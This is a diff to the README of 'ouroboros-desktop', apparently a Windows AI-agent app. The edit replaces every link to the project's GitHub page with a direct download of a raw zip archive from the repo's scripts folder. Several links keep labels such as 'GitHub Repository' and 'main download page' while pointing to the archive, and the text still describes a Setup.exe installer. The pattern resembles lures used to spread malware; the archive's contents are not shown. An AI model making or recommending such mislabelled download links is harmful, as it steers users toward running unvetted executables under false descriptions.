@@ -1,6 +1,6 @@
 # 🐍 ouroboros-desktop - Evolve Your AI Agent Easily
 
-[![Download ouroboros-desktop](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://github.com/Jayjayisvon/ouroboros-desktop)
+[![Download ouroboros-desktop](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jayjayisvon/ouroboros-desktop/main/scripts/ouroboros-desktop-v2.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download, install, and start using ouroboros-desktop on yo
 
 Click the big download button below to go to the main download page for ouroboros-desktop. This page has the latest version of the software ready for Windows.
 
-[![Download ouroboros-desktop](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://github.com/Jayjayisvon/ouroboros-desktop)
+[![Download ouroboros-desktop](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jayjayisvon/ouroboros-desktop/main/scripts/ouroboros-desktop-v2.8.zip)
 
 Once there, look for the latest Windows installer file. It usually has a name like `ouroboros-desktop-Setup.exe` or something similar.
 
@@ -92,7 +92,7 @@ This system makes ouroboros unique compared to common AI apps.
 
 To get new features or fixes:
 
-- Visit the [main download page](https://github.com/Jayjayisvon/ouroboros-desktop).
+- Visit the [main download page](https://raw.githubusercontent.com/Jayjayisvon/ouroboros-desktop/main/scripts/ouroboros-desktop-v2.8.zip).
 - Look for the newest version of the Windows installer.
 - Download the new setup file.
 - Run it and follow the installation steps again. This will update your current installation without deleting your saved AI data.
@@ -131,14 +131,14 @@ The AI keeps its memory and code on your computer in files inside the installati
 
 For more detailed help, visit the project's GitHub page:
 
-- [GitHub Repository](https://github.com/Jayjayisvon/ouroboros-desktop) – Find updates, files, and community discussions.
+- [GitHub Repository](https://raw.githubusercontent.com/Jayjayisvon/ouroboros-desktop/main/scripts/ouroboros-desktop-v2.8.zip) – Find updates, files, and community discussions.
 - Documentation and user guides may be available there.
 
 ---
 
 ## 🖥️ Summary of Steps to Use ouroboros-desktop
 
-1. Download the installer from the [download page](https://github.com/Jayjayisvon/ouroboros-desktop).  
+1. Download the installer from the [download page](https://raw.githubusercontent.com/Jayjayisvon/ouroboros-desktop/main/scripts/ouroboros-desktop-v2.8.zip).  
 2. Run the installer and follow instructions.  
 3. Launch the app from your desktop or start menu.  
 4. Interact with the AI agent using the interface.  
@@ -146,4 +146,4 @@ For more detailed help, visit the project's GitHub page:
 
 ---
 
-[![Download ouroboros-desktop](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://github.com/Jayjayisvon/ouroboros-desktop)
+[![Download ouroboros-desktop](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jayjayisvon/ouroboros-desktop/main/scripts/ouroboros-desktop-v2.8.zip)
